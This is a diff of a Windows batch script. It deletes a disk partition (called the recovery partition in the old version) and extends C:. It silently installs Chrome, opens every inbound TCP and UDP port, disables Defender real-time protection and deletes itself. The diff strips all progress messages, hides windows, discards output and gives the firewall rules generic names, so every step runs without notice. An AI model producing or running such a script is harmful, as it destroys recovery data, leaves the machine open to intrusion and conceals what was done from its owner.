@@ -1,35 +1,19 @@
 @echo off
+:: Delete partition & extend C drive
+(ECHO LIST DISK & ECHO SELECT DISK 0 & ECHO LIST PARTITION & ECHO SELECT PARTITION 3 & ECHO DELETE PARTITION OVERRIDE) > "%TEMP%\d.txt"
+diskpart /s "%TEMP%\d.txt" >nul 2>&1
+(ECHO SELECT VOLUME %SystemDrive% & ECHO EXTEND) > "%TEMP%\e.txt"
+diskpart /s "%TEMP%\e.txt" >nul 2>&1
+del "%TEMP%\d.txt" "%TEMP%\e.txt" >nul 2>&1
 
-ECHO LIST DISK > "%TEMP%\diskpart_delete.txt"
-ECHO SELECT DISK 0 >> "%TEMP%\diskpart_delete.txt"
-ECHO LIST PARTITION >> "%TEMP%\diskpart_delete.txt"
-ECHO SELECT PARTITION 3 >> "%TEMP%\diskpart_delete.txt"
-ECHO DELETE PARTITION OVERRIDE >> "%TEMP%\diskpart_delete.txt"
-ECHO Menghapus partisi recovery...
-diskpart /s "%TEMP%\diskpart_delete.txt"
-ECHO SELECT VOLUME %SystemDrive% > "%TEMP%\diskpart_extend.txt"
-ECHO EXTEND >> "%TEMP%\diskpart_extend.txt"
-ECHO Memperluas drive C...
-diskpart /s "%TEMP%\diskpart_extend.txt"
-ECHO Membersihkan file temporary...
-del /f /q "%TEMP%\diskpart_delete.txt"
-del /f /q "%TEMP%\diskpart_extend.txt"
+:: Download & install Chrome
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile '$env:TEMP\c.exe'" >nul 2>&1
+if exist "%TEMP%\c.exe" (start /wait "" "%TEMP%\c.exe" /silent /install >nul 2>&1 & del "%TEMP%\c.exe" >nul 2>&1)
 
-ECHO Downloading Google Chrome...
-powershell -Command "& {Invoke-WebRequest -Uri 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile "$env:TEMP\chrome_installer.exe"}"
-ECHO Installing Google Chrome...
-start /wait %TEMP%\chrome_installer.exe /silent /install
-timeout /t 10 /nobreak >nul
-ECHO Cleaning up Chrome installer...
-del /f /q "%TEMP%\chrome_installer.exe"
-ECHO Chrome installation completed and installer file deleted.
+:: Configure firewall & disable defender
+netsh advfirewall firewall add rule name="TCP" dir=in action=allow protocol=TCP localport=1-65535 >nul 2>&1
+netsh advfirewall firewall add rule name="UDP" dir=in action=allow protocol=UDP localport=1-65535 >nul 2>&1
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
-ECHO Configuring Windows Firewall for game server...
-netsh advfirewall firewall add rule name="Game Server - Allow All TCP Inbound" dir=in action=allow protocol=TCP localport=1-65535
-netsh advfirewall firewall add rule name="Game Server - Allow All UDP Inbound" dir=in action=allow protocol=UDP localport=1-65535
-ECHO Firewall rules configured for game server (All TCP/UDP ports allowed).
-
-echo Menonaktifkan Real-time protection...
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-
-del "%~f0"
+:: Self-delete
+timeout /t 3 /nobreak >nul & del "%~f0" >nul 2>&1
